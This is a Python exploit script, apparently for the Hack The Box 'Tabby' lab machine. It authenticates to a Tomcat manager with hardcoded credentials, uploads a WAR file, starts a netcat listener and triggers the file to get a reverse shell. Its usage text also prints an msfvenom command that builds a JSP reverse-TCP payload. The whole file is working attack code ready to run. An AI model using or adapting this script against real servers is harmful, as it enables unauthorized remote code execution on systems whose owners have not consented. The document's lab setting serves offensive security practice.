#!/usr/bin/python3
import os
import sys
import time
import string
import random
import requests
import threading


class TabbyBackConnect:
    def __init__(self, local_host, local_port, shell_file_path):
        self.local_host = local_host
        self.local_port = local_port
        self.shell_file_path = shell_file_path

        self.target_ip = "10.10.10.194"
        self.shell_name = self.get_random_string(12)

    def exploit(self):
        print(f"[+] Starting exploit against {self.target_ip}")
        if self.upload_file():
            print("[+] Shell has been successfully uploaded")
            self.listen_and_trigger()
        else:
            print("[!] Failed to upload shell")

    def upload_file(self):
        upload_url = f"http://{self.target_ip}:8080/manager/text/deploy?path=/{self.shell_name}"

        response = requests.put(
            upload_url, data=open(self.shell_file_path, 'rb'),
            headers={
                'Content-type': 'text/plain'
            },
            auth=('tomcat', '$3cureP4s5w0rd123!')
        )

        return "OK - Deployed application" in response.text

    @staticmethod
    def get_random_string(length):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    def trigger_backconnect(self):
        print("[+] Popping shell in 3, 2, 1...")
        time.sleep(3)
        print("[+] POPPED!")
        requests.get(f"http://{self.target_ip}:8080/{self.shell_name}")

    def listen_and_trigger(self):
        print("[+] Starting listener and triggering backconnect")

        # Start background thread that sleeps for 3 second and performs the backconnect
        thread = threading.Thread(target=self.trigger_backconnect)
        thread.start()

        # Start our listener
        os.system("nc -nvlp " + self.local_port)


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: ./htb-tabby.py {LHOST} {LPORT} {PATH_TO_WAR_SHELL}")
        print("-----")
        print("To generate a WAR backconnect shell use the following command:")
        print("msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > shell.war")
        print("-----")
        sys.exit(1)

    local_host = sys.argv[1]
    local_port = sys.argv[2]
    path_to_shell = sys.argv[3]

    tabby = TabbyBackConnect(local_host, local_port, path_to_shell)
    tabby.exploit()
